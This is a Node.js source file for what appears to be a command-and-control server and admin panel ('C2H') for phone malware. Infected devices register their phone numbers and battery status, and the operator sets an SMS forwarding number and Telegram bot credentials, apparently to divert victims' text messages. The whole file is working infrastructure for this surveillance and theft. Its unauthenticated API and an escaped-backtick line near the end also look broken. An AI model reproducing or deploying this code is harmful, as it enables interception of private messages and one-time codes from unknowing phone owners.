import sqlite3 from 'sqlite3';
import { open } from 'sqlite';
import { createServer } from 'http';

// ✅ DATABASE SETUP
let db;
async function initDB() {
  db = await open({
    filename: ':memory:',
    driver: sqlite3.Database
  });
  
  await db.exec(`
    CREATE TABLE IF NOT EXISTS devices (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT UNIQUE NOT NULL,
      device_name TEXT,
      os_version TEXT,
      phone_number TEXT,
      battery_level INTEGER,
      last_seen DATETIME NOT NULL,
      created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
    
    CREATE TABLE IF NOT EXISTS commands (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT NOT NULL,
      command_type TEXT NOT NULL,
      command_data TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'pending',
      created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
    
    CREATE TABLE IF NOT EXISTS global_settings (
      setting_key TEXT PRIMARY KEY,
      setting_value TEXT
    );
  `);
  console.log('✅ Database ready');
}

// ✅ PANEL HTML (सब एक साथ)
const HTML_PANEL = `<!DOCTYPE html>
<html>
<head>
    <title>C2H Admin Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:Arial; }
        body { background:#1a1a1a; color:#fff; padding:20px; }
        .header { text-align:center; padding:20px 0; }
        h1 { color:#3a86ff; font-size:28px; }
        .btn { width:100%; padding:15px; margin:10px 0; background:#3a86ff; color:white; border:none; border-radius:8px; font-size:16px; cursor:pointer; }
        .device { background:#2a2a2a; padding:15px; margin:10px 0; border-radius:8px; border-left:4px solid #3a86ff; }
        .online { color:#2ecc71; }
        .offline { color:#e74c3c; }
        .delete-btn { background:#e74c3c; color:white; border:none; padding:5px 10px; float:right; border-radius:5px; cursor:pointer; }
    </style>
</head>
<body>
    <div class="header">
        <h1>📱 C2H ADMIN PANEL</h1>
        <p>Real-time Device Management</p>
    </div>
    
    <button class="btn" onclick="updateForward()">📞 UPDATE FORWARD NUMBER</button>
    <button class="btn" onclick="updateTelegram()">🤖 UPDATE TELEGRAM</button>
    
    <h3>📋 DEVICES LIST</h3>
    <div id="deviceList">Loading...</div>
    
    <script>
        const API_BASE = window.location.origin;
        
        async function loadDevices() {
            try {
                const res = await fetch(API_BASE + '/api/devices');
                const devices = await res.json();
                
                let html = '';
                devices.forEach(device => {
                    html += \`
                    <div class="device">
                        <strong>\${device.device_name || 'Unknown'}</strong>
                        <span class="\${device.is_online ? 'online' : 'offline'}">
                            \${device.is_online ? '🟢 ONLINE' : '🔴 OFFLINE'}
                        </span>
                        <button class="delete-btn" onclick="deleteDevice('\${device.device_id}')">DELETE</button>
                        <br>
                        📱 <strong>ID:</strong> \${device.device_id}<br>
                        🔋 <strong>Battery:</strong> \${device.battery_level}%<br>
                        📞 <strong>Number:</strong> \${device.phone_number || 'N/A'}<br>
                        🕐 <strong>Last Seen:</strong> \${device.last_seen}
                    </div>\`;
                });
                
                document.getElementById('deviceList').innerHTML = html || 'No devices found';
            } catch (error) {
                document.getElementById('deviceList').innerHTML = 'Error loading devices';
            }
        }
        
        async function updateForward() {
            const number = prompt('Enter forwarding number:');
            if (!number) return;
            
            await fetch(API_BASE + '/api/config/sms_forward', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ forward_number: number })
            });
            alert('✅ Forward number updated!');
        }
        
        async function updateTelegram() {
            const token = prompt('Bot Token:');
            const chatId = prompt('Chat ID:');
            
            await fetch(API_BASE + '/api/config/telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ telegram_bot_token: token, telegram_chat_id: chatId })
            });
            alert('✅ Telegram details updated!');
        }
        
        async function deleteDevice(deviceId) {
            if (confirm('Delete this device?')) {
                await fetch(API_BASE + '/api/device/' + deviceId, { method: 'DELETE' });
                loadDevices();
            }
        }
        
        setInterval(loadDevices, 3000);
        loadDevices();
    </script>
</body>
</html>`;

// ✅ API HANDLING
async function handleRequest(req, res) {
  const url = req.url;
  const method = req.method;
  
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (method === 'OPTIONS') {
    res.writeHead(200);
    return res.end();
  }
  
  try {
    // Parse body
    let body = '';
    for await (const chunk of req) body += chunk;
    const data = body ? JSON.parse(body) : {};
    
    const now = () => new Date().toISOString().replace('T', ' ').substring(0, 19);
    
    // 1. DEVICE REGISTER
    if (url === '/api/device/register' && method === 'POST') {
      const { device_id, device_name, os_version, battery_level, phone_number } = data;
      const currentTime = now();
      
      const existing = await db.get('SELECT * FROM devices WHERE device_id = ?', [device_id]);
      
      if (existing) {
        await db.run(
          `UPDATE devices SET device_name=?, os_version=?, phone_number=?, battery_level=?, last_seen=? WHERE device_id=?`,
          [device_name, os_version, phone_number, battery_level, currentTime, device_id]
        );
      } else {
        await db.run(
          `INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)`,
          [device_id, device_name, os_version, phone_number, battery_level, currentTime, currentTime]
        );
      }
      
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ status: 'success', message: 'Device updated' }));
    }
    
    // 2. GET DEVICES
    if (url === '/api/devices' && method === 'GET') {
      const devices = await db.all('SELECT * FROM devices ORDER BY created_at ASC');
      
      const result = devices.map(device => {
        const lastSeen = new Date(device.last_seen);
        const diffSeconds = (Date.now() - lastSeen.getTime()) / 1000;
        return {
          ...device,
          is_online: diffSeconds < 20
        };
      });
      
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify(result));
    }
    
    // 3. DELETE DEVICE
    if (url.startsWith('/api/device/') && method === 'DELETE') {
      const deviceId = url.split('/')[3];
      await db.run('DELETE FROM devices WHERE device_id = ?', [deviceId]);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ status: 'success' }));
    }
    
    // 4. SMS FORWARD NUMBER
    if (url === '/api/config/sms_forward') {
      if (method === 'POST') {
        await db.run(
          `INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)`,
          ['sms_forward_number', data.forward_number]
        );
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ status: 'success' }));
      }
      if (method === 'GET') {
        const row = await db.get(
          `SELECT setting_value FROM global_settings WHERE setting_key = ?`,
          ['sms_forward_number']
        );
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ forward_number: row?.setting_value || '' }));
      }
    }
    
    // 5. TELEGRAM SETTINGS
    if (url === '/api/config/telegram') {
      if (method === 'POST') {
        await db.run(
          `INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)`,
          ['telegram_bot_token', data.telegram_bot_token]
        );
        await db.run(
          `INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)`,
          ['telegram_chat_id', data.telegram_chat_id]
        );
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ status: 'success' }));
      }
      if (method === 'GET') {
        const [token, chat] = await Promise.all([
          db.get(`SELECT setting_value FROM global_settings WHERE setting_key = ?`, ['telegram_bot_token']),
          db.get(`SELECT setting_value FROM global_settings WHERE setting_key = ?`, ['telegram_chat_id'])
        ]);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({
          telegram_bot_token: token?.setting_value || '',
          telegram_chat_id: chat?.setting_value || ''
        }));
      }
    }
    
    // 6. SHOW PANEL
    if (url === '/' || url === '/index.html') {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      return res.end(HTML_PANEL);
    }
    
    // 7. 404
    res.writeHead(404, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ error: 'Not found' }));
    
  } catch (error) {
    console.error('Error:', error);
    res.writeHead(500, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ error: 'Server error' }));
  }
}

// ✅ VERCEL HANDLER
export default async function handler(req, res) {
  if (!db) await initDB();
  return handleRequest(req, res);
}

// ✅ LOCAL SERVER (for testing)
if (process.env.NODE_ENV !== 'production') {
  async function startLocal() {
    await initDB();
    const server = createServer(handleRequest);
    const PORT = 3000;
    server.listen(PORT, () => {
      console.log(\`🚀 Server: http://localhost:\${PORT}\`);
      console.log(\`📱 Panel: http://localhost:\${PORT}\`);
      console.log(\`🔧 API: http://localhost:\${PORT}/api\`);
    });
  }
  startLocal();
}
